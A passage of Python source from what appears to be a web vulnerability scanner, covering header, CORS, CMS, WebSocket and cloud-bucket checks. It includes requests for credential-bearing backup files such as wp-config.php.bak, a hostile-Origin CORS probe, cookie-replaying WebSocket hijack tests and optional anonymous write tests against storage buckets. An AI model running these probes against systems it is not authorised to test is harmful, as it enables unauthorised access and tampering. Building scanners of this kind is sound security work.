SRI_SCRIPT_RX = re.compile(rb"<script\b[^>]*>", re.I)
SRI_SRC_RX = re.compile(rb"\bsrc\s*=\s*[\"']([^\"'\s>]+)[\"']", re.I)
SRI_LINK_RX = re.compile(rb"<link\b[^>]*>", re.I)
SRI_HREF_RX = re.compile(rb"\bhref\s*=\s*[\"']([^\"'\s>]+)[\"']", re.I)


def comment_leak_scan(host, body, findings, cap=2):
    """HTML comments that expose secrets (credential words, internal IPs).
    a commented-out <input type="password"> markup is not a leak - it is
    stripped before the keyword match (no-FP guard). returns findings added."""
    if not body:
        return 0
    n = 0
    b2 = body[:200000]
    if b2.count(b"<!--") > 8 * b2.count(b"-->") + 8:
        return 0   # hostile unbalanced openers: the lazy scan would be O(n^2)
    for m in COMMENT_RX.finditer(b2):
        c = COMMENT_SKIP_RX.sub(b"", m.group(1)).lower()
        hit = next((kw for kw in COMMENT_SENSITIVE if kw in c), None)
        if not hit:
            continue
        snip = re.sub(rb"\s+", b" ", m.group(1)).strip()[:90]
        findings.append(f"[COMMENT-LEAK] {host} HTML comment leaks "
                        f"'{hit.decode()}' -> {snip.decode('latin-1', 'ignore')}")
        n += 1
        if n >= cap:
            break
    return n


def sri_scan(host, body, findings, cap=2):
    """third-party <script src=https://...> and <link rel=stylesheet href=...>
    without an integrity attribute (supply-chain pinning). same-host and same
    registrable-domain refs are skipped; inline/relative refs are not
    applicable. returns count."""
    if not body:
        return 0
    h = host.split(":")[0].lower()
    hdom = ".".join(h.split(".")[-2:])
    n = 0
    for rx, arx, kind in ((SRI_SCRIPT_RX, SRI_SRC_RX, "script"),
                          (SRI_LINK_RX, SRI_HREF_RX, "stylesheet")):
        for tag in rx.findall(body[:200000]):
            if b"integrity" in tag.lower():
                continue
            if kind == "stylesheet" and b"stylesheet" not in tag.lower():
                continue
            m = arx.search(tag)
            if not m:
                continue
            src = m.group(1).decode("latin-1", "ignore")
            if not src.lower().startswith(("http://", "https://")):
                continue
            netloc = urlsplit(src).netloc.split("@")[-1].split(":")[0].lower()
            if not netloc or netloc == h:
                continue
            if ".".join(netloc.split(".")[-2:]) == hdom:
                continue                       # own infra / subdomain CDN
            findings.append(f"[SRI-MISSING] {host} third-party {kind} {src[:90]} "
                            f"loaded without an integrity attribute "
                            f"(supply-chain risk)")
            n += 1
            if n >= cap:
                return n
    return n


async def probe_one(session, host, findings):
    async with HTTP_SEM:
        for scheme in ("https", "http"):
            try:
                async with session.get(f"{scheme}://{host}/", headers=UA,
                                       timeout=aiohttp.ClientTimeout(total=12),
                                       ssl=False, allow_redirects=True) as r:
                    body = await r.content.read(65536)
                    m = TITLE_RE.search(body or b"")
                    title = (m.group(1).decode("utf-8", "ignore").strip().replace("\n", " ")[:70]
                             if m else "")
                    hdr, cookies = {}, []
                    for k, v in r.headers.items():
                        kl = k.lower()
                        if kl == "set-cookie":
                            cookies.append(v)
                        else:
                            hdr[kl] = v
                    loc = str(r.url)
                    chain = [str(x.url) for x in r.history]
                    tech = [t for t, pats in TECH.items()
                            if any(p.lower() in (body or b"").lower() or p.lower()
                                   in hdr.get("server", "").lower().encode()
                                   or p.lower() in hdr.get("x-powered-by", "").lower().encode()
                                   for p in pats)]
                    if scheme == "https" and 200 <= r.status < 500:
                        hsts = hdr.get("strict-transport-security", "")
                        hsts_ok = bool(hsts) and any(
                            int(x) >= 15552000
                            for x in re.findall(r"max-age\s*=\s*(\d+)",
                                                hsts, re.I))
                        miss = [h for h in ("strict-transport-security",
                                            "content-security-policy",
                                            "x-content-type-options",
                                            "referrer-policy",
                                            "x-frame-options",
                                            "permissions-policy",
                                            "cross-origin-opener-policy",
                                            "cross-origin-resource-policy",
                                            "x-permitted-cross-domain-policies")
                                if h not in hdr]
                        # a missing-header claim is only evidence about a page
                        # users actually see: error pages (4xx) are served by
                        # different stacks and must not drive the claim
                        if miss and 200 <= r.status < 400:
                            findings.append(f"[HEADERS] {host} missing: {', '.join(miss)}")
                        if hsts and not hsts_ok:
                            findings.append(
                                f"[HEADERS] {host} HSTS too weak "
                                f"(max-age < 180d): {hsts[:60]}")
                        # mixed content only matters on rendered pages (2xx/3xx)
                        mm = MIXED_RX.findall(body or b"") if 200 <= r.status < 400 else []
                        if mm:
                            findings.append(
                                f"[MIXED-CONT] {host} loads {len(mm)} insecure "
                                f"http:// subresource(s) on https (e.g. "
                                f"{mm[0].decode('latin-1', 'ignore')[:60]})")
                    if r.status == 200 and dirlist_hit(body or b""):
                        findings.append(f"[DIRLIST] {host} root directory listing enabled")
                    if r.status == 200:
                        # strip HTML comments first: a commented-out password
                        # field must not trigger CLICKJACK/LOGIN-CSRF
                        _b = body or b""
                        if _b.count(b"<!--") <= 8 * _b.count(b"-->") + 8:
                            _b = COMMENT_RX.sub(b"", _b)
                        bl = _b.lower()
                        pwform = (b'type="password"' in bl
                                  or b"type='password'" in bl
                                  or b"type=password" in bl)
                        if pwform \
                                and "x-frame-options" not in hdr \
                                and "frame-ancestors" not in hdr.get(
                                    "content-security-policy", "").lower():
                            findings.append(
                                f"[CLICKJACK] {host} serves a password form framable "
                                f"(no x-frame-options / CSP frame-ancestors)")
                        if pwform:
                            if loc.startswith("http://"):
                                findings.append(
                                    f"[LOGIN-PLAIN] {host} serves a password "
                                    f"form over plaintext http ({loc[:80]}) - "
                                    f"credentials sniffable on the wire")
                            csrf_cookie = any(
                                "csrf" in c.split(";")[0].lower()
                                or "xsrf" in c.split(";")[0].lower()
                                for c in cookies)
                            if not CSRF_RX.search(bl) and not csrf_cookie:
                                findings.append(
                                    f"[LOGIN-CSRF] {host} password form posts "
                                    f"without an anti-CSRF token (no csrf/xsrf "
                                    f"field or cookie) - login CSRF")
                        for _au in OAUTH_ATTR_RX.findall(
                                (body or b"").decode("latin-1", "ignore")):
                            if oauth_state_issue(_au):
                                findings.append(
                                    f"[OAUTH-STATE] {host} authorize URL without "
                                    f"`state`: {_au[:90]} - OAuth login CSRF")
                                break
                        comment_leak_scan(host, body, findings)
                        sri_scan(host, body, findings)
                    if r.status in (401, 407) and loc.startswith("http://") \
                            and "basic" in (hdr.get("www-authenticate") or "").lower():
                        findings.append(
                            f"[AUTH-PLAIN] {host} challenges HTTP Basic over "
                            f"plaintext http ({loc[:80]}) - credentials "
                            f"sniffable on the wire")
                    # IIS 8.3 shortname: ~1 probe vs ~2 control must differ
                    # AND reproduce on a second round (429/5xx throttling or a
                    # dynamic backend must never read as disclosure)
                    powered = hdr.get("x-powered-by", "").lower()
                    if r.status in (200, 403, 404) and (
                            "iis" in hdr.get("server", "").lower()
                            or "asp.net" in powered):
                        L = chr(97 + os.urandom(1)[0] % 26)
                        _skip_st = (408, 429, 500, 502, 503, 504)

                        async def _tilde_round():
                            sts = []
                            for tild in ("1", "2"):
                                async with session.get(
                                        f"{scheme}://{host}/{L}*~{tild}*/",
                                        headers=UA, allow_redirects=False,
                                        ssl=False, timeout=aiohttp.ClientTimeout(
                                            total=8)) as rtil:
                                    sts.append(rtil.status)
                            return sts

                        try:
                            sts = await _tilde_round()
                            if (sts[0] != sts[1]
                                    and not set(sts) & set(_skip_st)):
                                conf = await _tilde_round()
                                if conf == sts and not set(conf) & set(_skip_st):
                                    findings.append(
                                        f"[IIS-SHORTNAME] {host} 8.3 shortname "
                                        f"disclosure (~1 probe {sts[0]} vs control "
                                        f"~2 {sts[1]}, reproduced twice) - "
                                        f"enumerate sensitive paths")
                        except Exception:
                            pass
                    csp_scan(host, hdr.get("content-security-policy", ""), findings)
                    cookie_scan(host, cookies, scheme, findings)
                    jwt_scan(host, body, findings)
                    tabnab_scan(host, body, findings)
                    if cookies:
                        jwt_scan(host, "; ".join(cookies), findings)
                    waf = waf_fingerprint(hdr, body)
                    if waf:
                        tech.append(f"WAF:{waf}")
                        rate_seed(_rate_key(loc), 0.15)
                        rate_seed(_rate_key(
                            ("http" if loc.startswith("https") else "https")
                            + f"://{host}/"), 0.15)
                    name = fp_match(body or b"")
                    if name and name not in GENERIC_FP:
                        tech.append(f"TAKEOVER:{name}")   # reported only as tech;
                        # actionable takeover signal comes from phase 4 CNAME
                        # dangling detection + phase 10 confirmation (a bare
                        # platform-page match on a healthy host is not a vuln)
                    return host, {
                        "scheme": scheme, "status": r.status, "title": title,
                        "server": hdr.get("server", ""), "powered": hdr.get("x-powered-by", ""),
                        "final_url": loc, "redirects": len(chain), "chain": chain,
                        "length": len(body or b""), "tech": sorted(set(tech)),
                        "waf": waf,
                        "headers": hdr, "cookies": cookies, "body": body or b"",
                        "scripts": [urljoin(loc, x.decode("utf-8", "ignore"))
                                    for x in JS_RE.findall(body or b"")][:15],
                    }
            except Exception:
                continue
    return host, {"scheme": "", "status": 0, "title": "", "server": "", "powered": "",
                  "final_url": "", "redirects": 0, "chain": [], "length": 0, "tech": [],
                  "waf": "", "headers": {}, "cookies": [], "body": b"", "scripts": []}


async def probe_all(hosts, findings):
    rows, done = {}, 0
    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    async with tsession(conn) as s:
        # bounded fan-out: batch hosts so at most CHUNK coroutines are
        # materialized at once (was one coroutine per host, eagerly).
        CHUNK = 1024
        for i in range(0, len(hosts), CHUNK):
            tasks = [probe_one(s, h, findings) for h in hosts[i:i + CHUNK]]
            for coro in asyncio.as_completed(tasks):
                h, info = await coro
                done += 1
                rows[h] = info
                if done % 50 == 0:
                    print(f"  [probe] {done}/{len(hosts)}", flush=True)
    return rows


BUCKET_NAMES_RX = (
    r"([a-z0-9][a-z0-9.\-]{2,60})\.s3\.amazonaws\.com",
    r"s3\.amazonaws\.com/([a-z0-9][a-z0-9.\-]{2,60})",
    r"storage\.googleapis\.com/([a-z0-9][a-z0-9.\-]{2,60})",
    r"([a-z0-9][a-z0-9.\-]{2,60})\.blob\.core\.windows\.net",
)
BUCKET_NAME_SKIP = {"static", "assets", "cdn", "img", "images", "media", "js",
                    "css", "fonts", "mail", "webmail", "dev", "test", "staging",
                    "api", "app", "admin", "blog", "shop", "docs", "node_modules",
                    "bundle", "uploads", "files", "www"}


def bucket_names(domains, probes, max_names=10):
    """derive candidate bucket names from targets + page content (pure)."""
    names = set()
    for d in domains or []:
        d = (d or "").lower().strip(".")
        if not d:
            continue
        names.add(d)
        # NO bare first-label derivation (example.com -> "example"): that
        # label is owned by anyone - cross-owner probing made bucket_enum
        # claim other people's buckets (full domain names stay - dots make
        # them owner-specific)
    for h, i in (probes or {}).items():
        body = i.get("body") or b""
        txt = body.decode("latin-1", "ignore") if isinstance(body, (bytes, bytearray)) else str(body)
        for rx in BUCKET_NAMES_RX:
            for m in re.finditer(rx, txt, re.I):
                b = m.group(1).lower().strip(".-")
                if b and b not in BUCKET_NAME_SKIP and ".." not in b:
                    names.add(b)
        # same rule as domains: the bare first label of a hostname is a
        # cross-owner name - only explicit references (RX) and full
        # dotted domains count
    return sorted(names)[:max_names]


def bucket_urls(names, budget=60):
    """derived bucket names -> [(url, name, kind)] probe list."""
    urls = []
    for n in names:
        urls += [(f"https://{n}.s3.amazonaws.com", n, "s3"),
                 (f"https://storage.googleapis.com/{n}", n, "gcs"),
                 (f"https://{n}.blob.core.windows.net", n, "azure"),
                 (f"https://{n}.digitaloceanspaces.com", n, "do"),
                 (f"https://{n}.s3.us-east-1.wasabisys.com", n, "wasabi"),
                 (f"https://{n}.s3.us-east-1.amazonaws.com", n, "s3"),
                 (f"https://{n}.s3.eu-west-1.amazonaws.com", n, "s3")]
    return urls[:budget]


async def bucket_enum(domains, probes, findings, max_names=10, budget=70,
                      do_write=False):
    """derive S3/GCS/Azure bucket names from targets + page content, probe them.
    with do_write: an existing (private or open) bucket gets a canary PUT ->
    GET must serve it back (evidence) -> best-effort DELETE + removal check;
    a refused PUT or an unverifiable write produces no finding (no-FP rule
    shared with put_delete_checks). at most 5 write tests per run."""
    names = bucket_names(domains, probes, max_names)
    if not names:
        return 0
    urls = bucket_urls(names, budget)
    hits, writes = 0, 0
    seen_hit = set()          # one finding per (name, provider): the global
    sem = asyncio.Semaphore(20)   # and regional endpoints are the same bucket
    listing_rx = ("ListBucketResult", "<Blobs>", "EnumerationResults", "<Contents>")
    async with xsession(aiohttp.TCPConnector(limit=0, ssl=False)) as s:

        async def try_write(url, n, kind):
            nonlocal writes
            if writes >= 5:
                return
            writes += 1
            tok = os.urandom(4).hex()
            can = f"sxe-bkt-{tok}"
            obj = f"{url}/{can}.txt"
            stp = None
            try:
                async with s.put(obj, data=can.encode(),
                                 headers={"Content-Type": "text/plain"},
                                 timeout=aiohttp.ClientTimeout(total=10),
                                 ssl=False, allow_redirects=False) as rp:
                    stp = rp.status
            except Exception:
                stp = None
            if stp not in (200, 201, 204):
                return                      # write refused -> no claim
            stg, bg = None, b""
            try:
                async with s.get(obj, timeout=aiohttp.ClientTimeout(total=10),
                                 ssl=False, allow_redirects=False) as rg:
                    stg = rg.status
                    if stg == 200:
                        bg = await rg.content.read(4096)
            except Exception:
                stg = None
            persisted = (stg == 200 and can.encode() in bg)
            dst, st2 = None, None
            try:
                async with s.delete(obj, timeout=aiohttp.ClientTimeout(total=10),
                                    ssl=False, allow_redirects=False) as rd:
                    dst = rd.status
            except Exception:
                dst = None
            try:
                async with s.get(obj, timeout=aiohttp.ClientTimeout(total=10),
                                 ssl=False, allow_redirects=False) as rg2:
                    st2 = rg2.status
            except Exception:
                st2 = None
            if not persisted:
                return                      # never served -> not a write vuln
            removed = st2 in (403, 404)
            note = ("canary removed after test" if removed
                    else f"WARNING: canary not removable (DELETE {dst})")
            findings.append(
                f"[BUCKET-WRITE] {n}: anonymous PUT to {obj} accepted "
                f"({stp}) and GET-verified ({stg}) on a public {kind} "
                f"bucket - public write, object overwrite / malware "
                f"hosting ({note})")

        def prov_id(kind, hdr, body_lo):
            """prove the answer came from the storage provider - a captive
               portal / proxy / middlebox 403 for these hosts is NOT a bucket"""
            srv = (hdr.get("Server") or "").lower()
            if kind == "s3":
                return ("amazons3" in srv or "x-amz-request-id" in hdr
                        or b"<code>accessdenied</code>" in body_lo)
            if kind == "gcs":
                return ("x-guploader-uploadid" in hdr or "uploadserver" in srv
                        or b"<code>accessdenied</code>" in body_lo)
            if kind == "azure":
                return ("windows-azure-blob" in srv or "x-ms-request-id" in hdr
                        or b"<code>" in body_lo)
            if kind == "do":
                return ("digitalocean" in srv
                        or "x-do-" in " ".join(hdr.keys()).lower()
                        or b"<code>" in body_lo)
            if kind == "wasabi":
                return ("wasabi" in srv or "x-amz-request-id" in hdr
                        or b"<code>" in body_lo)
            return False

        async def check(url, n, kind):
            nonlocal hits
            async with sem:
                try:
                    async with s.get(url, timeout=aiohttp.ClientTimeout(total=10),
                                     ssl=False, allow_redirects=False) as r:
                        if r.status in (403, 401):
                            body1 = (await r.content.read(4096)).lower()
                            if not prov_id(kind, r.headers, body1):
                                return
                            # stability round: a transient middlebox answer
                            # must not survive a second identical request
                            async with s.get(url,
                                             timeout=aiohttp.ClientTimeout(total=10),
                                             ssl=False,
                                             allow_redirects=False) as r2:
                                if r2.status not in (403, 401):
                                    return
                            if (n, kind) in seen_hit:
                                return          # same bucket via another endpoint
                            seen_hit.add((n, kind))
                            findings.append(f"[BUCKET] {n}: {kind} bucket exists "
                                            f"(private) - {url}")
                            hits += 1
                            if do_write:
                                await try_write(url, n, kind)
                            return
                        if r.status == 200:
                            # no redirects: the listing body must come from
                            # the bucket endpoint itself (r.url unchanged)
                            body = (await r.content.read(16384))
                            txt = body.decode("latin-1", "ignore")
                            if any(k in txt for k in listing_rx):
                                if (n, kind) in seen_hit:
                                    return      # same bucket via another endpoint
                                seen_hit.add((n, kind))
                                findings.append(f"[BUCKET-OPEN] {n}: public {kind} "
                                                f"bucket LISTING - {url}")
                                hits += 1
                                if do_write:
                                    await try_write(url, n, kind)
                                return
                except Exception:
                    return
        await asyncio.gather(*[check(u, n, k) for u, n, k in urls])
    if hits:
        print(f"  [buckets] -> {hits} hit(s) across {len(names)} name(s)", flush=True)
    return hits


WS_URL_RX = re.compile(r"wss?://[^\s\"'<>\\)]{4,140}")
WS_NEW_RX = re.compile(r"new\s+WebSocket\(\s*[\"']([^\"']+)[\"']")
WS_COMMON = ("/socket.io/?EIO=4&transport=websocket", "/ws")
WS_HINTS = ("socket.io", "websocket", "sockjs", "graphql-ws", "ws://", "wss://")


async def websocket_scan(probes, findings, cap_hosts=25, per_host=3):
    """mine ws://(s) endpoints from page content, connect, scan frames for secrets."""
    checked = hits = 0
    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    async with tsession(conn) as s:
        targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
        sem = asyncio.Semaphore(10)

        async def one(h):
            nonlocal checked, hits
            i = probes[h]
            base = _burl(probes, h)
            body = i.get("body") or b""
            txt = (body.decode("latin-1", "ignore")
                   if isinstance(body, (bytes, bytearray)) else str(body))
            urls = list(dict.fromkeys(WS_URL_RX.findall(txt)))
            for rel in WS_NEW_RX.findall(txt):
                urls.append(rel if rel.startswith(("ws://", "wss://"))
                            else urljoin(base, rel))
            low = txt.lower()
            if any(k in low for k in WS_HINTS):
                urls += [base + p for p in WS_COMMON]
            seen, n = set(), 0
            for u in urls:
                if u in seen or n >= per_host:
                    continue
                seen.add(u)
                n += 1
                if u.startswith("http://"):
                    u = "ws://" + u[7:]
                elif u.startswith("https://"):
                    u = "wss://" + u[8:]
                async with sem:
                    checked += 1
                    try:
                        async with asyncio.timeout(8):
                            ws = await s.ws_connect(u, ssl=False, max_msg_size=65536)
                        async with ws:
                            frames, blob = 0, bytearray()
                            deadline = time.time() + 2.5
                            while frames < 8 and time.time() < deadline:
                                try:
                                    m = await asyncio.wait_for(
                                        ws.receive(),
                                        timeout=max(0.3, deadline - time.time()))
                                except (asyncio.TimeoutError, TimeoutError):
                                    break
                                if m.type in (aiohttp.WSMsgType.TEXT,
                                              aiohttp.WSMsgType.BINARY):
                                    frames += 1
                                    d = (m.data if isinstance(m.data, (bytes, bytearray))
                                         else str(m.data).encode())
                                    blob += d[:8000]
                                elif m.type in (aiohttp.WSMsgType.CLOSED,
                                                aiohttp.WSMsgType.ERROR):
                                    break
                            hits += 1
                            findings.append(f"[WS] {h}: websocket reachable - {u} "
                                            f"({frames} frame(s))")
                            if blob:
                                jwt_scan(h, bytes(blob), findings)
                            if i.get("cookies"):
                                # replay the site's own session cookies so the
                                # handshake reflects a real browser (CSWSH with
                                # credentials), not an anonymous connection
                                ck = "; ".join(c.split(";")[0].strip()
                                               for c in i["cookies"]
                                               if "=" in c)
                                eheaders = {"Origin":
                                            "https://sxe-cswsh.invalid"}
                                if ck:
                                    eheaders["Cookie"] = ck
                                try:
                                    async with asyncio.timeout(8):
                                        ws2 = await s.ws_connect(
                                            u, ssl=False, max_msg_size=1024,
                                            headers=eheaders)
                                    await ws2.close()
                                    findings.append(
                                        f"[CSWSH] {h}: {u} accepted handshake "
                                        f"with cross-site Origin "
                                        f"https://sxe-cswsh.invalid"
                                        + (f" and the site's session cookies"
                                           if ck else "")
                                        + " - CSWSH")
                                except Exception:
                                    pass
                    except Exception:
                        return

        await asyncio.gather(*[one(h) for h in targets])
    if checked:
        print(f"  [ws] -> {hits} reachable endpoint(s) / {checked} tried", flush=True)
    return hits


# ---------------- wildcard DNS detection + filtering ----------------
def wc_zone_candidates(hosts, domains, min_kids=4):
    """parent zones with enough children to be worth testing for wildcard DNS."""
    parents = {}
    for h in hosts:
        if "." in h:
            p = h.split(".", 1)[1]
            parents[p] = parents.get(p, 0) + 1
    return [p for p, n in sorted(parents.items(), key=lambda kv: -kv[1])
            if n >= min_kids and any(p == d or p.endswith("." + d) for d in domains)]


async def detect_wildcards(zones, domains, already=None, max_zones=60):
    """zones that answer random labels with records -> wildcard DNS."""
    already = already or {}
    zones = [z for z in dict.fromkeys(zones)
             if z not in already
             and any(z == d or z.endswith("." + d) for d in domains)][:max_zones]
    wc = {}
    if not zones:
        return wc
    conn = _dns_connector()
    async with plain_session(conn) as s:
        async def test(z):
            sets = []
            for _ in range(3):
                ans = await doh(s, f"wc{os.urandom(5).hex()}.{z}", "A", 0)
                sets.append(frozenset(d for t, d in (ans or []) if t == 1))
            return z, sets
        for z, sets in await asyncio.gather(*[test(z) for z in zones]):
            if not any(sets):
                continue
            wc[z] = {"ips": sorted(set().union(*sets)),
                     "stable": all(x == sets[0] for x in sets)}
    if wc:
        print(f"      wildcard DNS: {', '.join(sorted(wc))}", flush=True)
    return wc


async def wc_baseline(session, zone):
    """HTTP fingerprint of a random name under a wildcard zone."""
    host = f"wc{os.urandom(5).hex()}.{zone}"
    for scheme in ("https", "http"):
        try:
            async with session.get(f"{scheme}://{host}/", headers=UA,
                                   timeout=aiohttp.ClientTimeout(total=10),
                                   ssl=False, allow_redirects=True) as r:
                body = await r.content.read(65536)
                m = TITLE_RE.search(body or b"")
                title = (m.group(1).decode("utf-8", "ignore").strip()
                         .replace("\n", " ")[:70] if m else "")
                return {"status": r.status, "title": title,
                        "length": len(body or b""), "pref": (body or b"")[:256]}
        except Exception:
            continue
    return None


def _is_wildcard_hit(info, base):
    """True = looks like the zone's filler page, False = distinct, None = unknown."""
    if not base or not info or not info.get("status"):
        return None
    if info.get("status") != base["status"]:
        return False
    ln, bl = int(info.get("length") or 0), base["length"]
    if abs(ln - bl) > max(120, int(max(ln, bl) * 0.15)):
        return False
    ti, tb = (info.get("title") or "").strip(), (base["title"] or "").strip()
    if ti or tb:
        return ti == tb
    body, pref = info.get("body") or b"", base["pref"]
    n = min(len(pref), len(body))
    if n < 40:
        return True
    return pref[:n] == body[:n]


def _prune_findings(findings, hosts):
    if not findings or not hosts:
        return
    hs = sorted({h for h in hosts if h}, key=len, reverse=True)
    pats = [(h, re.compile(r"(?<![\w.-])" + re.escape(h) + r"(?![\w.-])")) for h in hs]
    out = []
    for f in findings:
        cand = [p for h, p in pats if h in f]
        if cand and any(p.search(f) for p in cand):
            continue
        out.append(f)
    findings[:] = out


async def wildcard_filter(live, probes, wc, suspects, evidence, findings, enabled=True):
    """drop brute-only hits that are indistinguishable from wildcard filler.

    evidence-backed hosts (passive OSINT / DNS records / AXFR / TLS SAN) are never
    dropped; without probe results the decision falls back to IP-set matching.
    """
    if not enabled or not wc:
        return 0
    suspects = set(suspects) & set(live)
    if not suspects:
        return 0
    zones = sorted(wc, key=len, reverse=True)

    def zone_of(h):
        for z in zones:
            if h.endswith("." + z):
                return z
        return None

    todo = {}
    for h in suspects:
        if h in evidence:
            continue
        z = zone_of(h)
        if z:
            todo[h] = z
    if not todo:
        return 0
    bases = {}
    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    async with tsession(conn) as s:
        for z in sorted(set(todo.values())):
            bases[z] = await wc_baseline(s, z)
    dropped = []
    for h, z in todo.items():
        info = (probes or {}).get(h)
        base = bases.get(z)
        verdict = _is_wildcard_hit(info, base)
        if verdict is None and base is None and info and info.get("status"):
            verdict = False           # live page but no baseline to compare -> keep
        if verdict is None:
            verdict = bool(wc[z]["stable"]) and set(live[h]) <= set(wc[z]["ips"])
        if verdict:
            dropped.append(h)
    if not dropped:
        return 0
    for h in dropped:
        live.pop(h, None)
        if probes:
            probes.pop(h, None)
    _prune_findings(findings, dropped)
    per = Counter(todo[h] for h in dropped)
    for z, n in sorted(per.items()):
        findings.append(f"[WILDCARD] {z} wildcard DNS -> {n} filler hosts filtered")
    print(f"  [wildcard] filtered {len(dropped)} filler hosts "
          f"({', '.join(f'{z}:{n}' for z, n in sorted(per.items()))})", flush=True)
    return len(dropped)


# ---------------- phase 6: security checks + deep crawl ----------------
async def security_checks(host, info, findings, session):
    """CORS / cookie / OPTIONS checks. runs on http AND https hosts and on
    any responded status (a 404 can still carry CORS+cookie bugs). the CORS
    probe ALWAYS sends a hostile Origin (origin-conditional reflectors are
    the common case) and the high-severity tags require
    Access-Control-Allow-Credentials: true - reflected origin without
    credentials only exposes public data -> CORS-OPEN (medium)."""
    if not info.get("status"):
        return
    url = info.get("final_url") or f"https://{host}/"
    # cookies: probe_one's cookie_scan already reports these with proper
    # attribute parsing - no duplicate loop here (findings dedupe would
    # miss the differently-formatted strings otherwise)
    try:
        async with HTTP_SEM:
            async with session.get(url, headers={**UA,
                                                 "Origin": "https://evil.example.com"},
                                   timeout=aiohttp.ClientTimeout(total=8),
                                   ssl=False, allow_redirects=False) as r:
                ra = (r.headers.get("access-control-allow-origin") or "").strip()
                creds = (r.headers.get(
                    "access-control-allow-credentials") or "").strip().lower()
                if ra == "*":
                    if creds == "true":
                        findings.append(
                            f"[CORS-WIDE] {host} Access-Control-Allow-Origin: * "
                            f"with Allow-Credentials: true (browsers block this "
                            f"combo but the intent is wildcard CORS)")
                    else:
                        findings.append(
                            f"[CORS-OPEN] {host} Access-Control-Allow-Origin: * "
                            f"(no credentials, public data readable cross-origin)")
                elif r.status in (301, 302, 303, 307, 308) and \
                        ra.lower() == "https://evil.example.com":
                    # edge/CDN adds CORS headers on the redirect hop itself -
                    # the follow-up request inherits cross-origin readability
                    findings.append(
                        f"[CORS-REDIR] {host} {r.status} response to {url} "
                        f"carries Access-Control-Allow-Origin: {ra} "
                        f"(Allow-Credentials: {creds or 'absent'}) - CORS "
                        f"misconfig on the redirect hop")
                elif ra.lower() == "https://evil.example.com":
                    if creds == "true":
                        findings.append(
                            f"[CORS-REFLECT] {host} reflects Origin with "
                            f"Allow-Credentials: true (any origin can read "
                            f"this session's responses)")
                    else:
                        findings.append(
                            f"[CORS-OPEN] {host} reflects Origin without "
                            f"credentials (public data only, no session read)")
                elif ra.lower() == "null" and creds == "true":
                    # literal ACAO: null is the sandboxed-iframe / file://
                    # origin - with credentials it reads authenticated
                    # responses from any page that can frame a null origin
                    findings.append(
                        f"[CORS-NULL] {host} Access-Control-Allow-Origin: null "
                        f"with Allow-Credentials: true (sandboxed iframes and "
                        f"file:// pages send Origin: null - they can read "
                        f"this session's responses)")
    except Exception:
        pass
    try:
        async with HTTP_SEM:
            async with session.request("OPTIONS", url, headers=UA,
                                       timeout=aiohttp.ClientTimeout(total=8),
                                       ssl=False) as r:
                allow = r.headers.get("allow", "")
                au = allow.upper()
                bad = [m for m in DANGEROUS_METHODS if m in au]
                if bad:
                    findings.append(f"[METHODS] {host} allows {','.join(bad)} (Allow: {allow[:60]})")
    except Exception:
        pass


async def cms_checks(host, info, findings, session):
    """CMS bug finder: WordPress / Drupal / Joomla / Magento config backups,
    debug logs, xmlrpc and version-disclosure paths - each proven by body
    content (credentials text, methodResponse, version markup)."""
    if not info.get("status"):
        return
    url = info.get("final_url") or f"https://{host}/"
    sp = urlsplit(url)
    base = f"{sp.scheme}://{sp.netloc}"
    n = [0]

    async def hit(path, rx, tag, why, method="GET", data=None):
        if n[0] >= 12:
            return
        n[0] += 1
        try:
            kw = dict(headers=dict(UA), timeout=aiohttp.ClientTimeout(total=8),
                      allow_redirects=False, ssl=False)
            async with HTTP_SEM:
                if method == "POST":
                    async with session.post(base + path, data=data, **kw) as r:
                        if r.status != 200:
                            return
                        body = await r.content.read(80_000)
                else:
                    async with session.get(base + path, **kw) as r:
                        if r.status != 200:
                            return
                        body = await r.content.read(80_000)
            if re.search(rx, body):
                findings.append(f"[{tag}] {base}{path} {why}")
        except Exception:
            return

    cfg = rb"(?i)(DB_NAME|DB_PASSWORD|define\s*\(\s*['\"]DB_|\$databases)"
    await hit("/wp-config.php.bak", cfg, "CMS-CFG-BAK",
              "WordPress config backup readable - database credentials exposed")
    await hit("/wp-config.php.save", cfg, "CMS-CFG-BAK",
              "WordPress config backup readable - database credentials exposed")
    await hit("/wp-config.php~", cfg, "CMS-CFG-BAK",
              "WordPress config backup readable - database credentials exposed")
    await hit("/wp-config.old", cfg, "CMS-CFG-BAK",
              "WordPress config backup readable - database credentials exposed")
    await hit("/configuration.php.bak", rb"(?i)(\$password\s*=|\$db\s*=)",
              "CMS-CFG-BAK",
              "Joomla configuration backup readable - database credentials exposed")
    await hit("/sites/default/settings.php.bak", rb"(?i)(\$databases|\$password\s*=)",
              "CMS-CFG-BAK",
              "Drupal settings backup readable - database credentials exposed")
    await hit("/app/etc/env.php", rb"(?i)['\"]password['\"]\s*=>", "CMS-CFG-BAK",
              "Magento env.php readable - DB credentials + encryption key exposed")
    await hit("/wp-content/debug.log",
              rb"(?i)(PHP (Warning|Fatal error|Notice):|Stack trace:)",
              "CMS-DEBUGLOG",
              "WordPress debug.log readable - stack traces leak paths/queries, often secrets")
    await hit("/xmlrpc.php", rb"(?i)(methodResponse|system\.listMethods)",
              "CMS-XMLRPC",
              "xmlrpc.php enabled - multicall brute-force + pingback SSRF amplifier",
              method="POST",
              data='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>')
    await hit("/CHANGELOG.txt", rb"(?im)^(Drupal|Joomla!)\s+[\d.]+", "CMS-VER-DISC",
              "version disclosed via changelog - update and remove public changelog")
    await hit("/readme.html", rb"(?i)Version\s*[\d.]+", "CMS-VER-DISC",
              "WordPress version disclosed via readme.html - remove it from production")
    await hit("/manifests/files/joomla.xml", rb"(?i)<version>[\d.]+", "CMS-VER-DISC",
              "Joomla version disclosed via the install manifest")


def crawl_ok(u, root_netloc):
    sp = urlsplit(u)
    if sp.scheme not in ("http", "https"):
        return False
    if (sp.netloc or "").lower().split(":")[0] != root_netloc:
        return False
    path = sp.path or "/"
    if len(u) > 300 or any(c in u for c in (" ", "%", "$", "{", "}", "\\", "`", '"')):
        return False
    if "//" in path or ".." in path:
        return False
    return True


async def deep_crawl(probes, findings, mined, scripts_by_host, pages, surf=None):
    """security checks on every host + BFS crawl of live pages (same host only)."""
    stats = {"pages": 0, "hosts": 0}
    if not probes:
        return stats
    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    async with tsession(conn) as s:
        async def one(h):
            info = probes[h]
            await security_checks(h, info, findings, s)
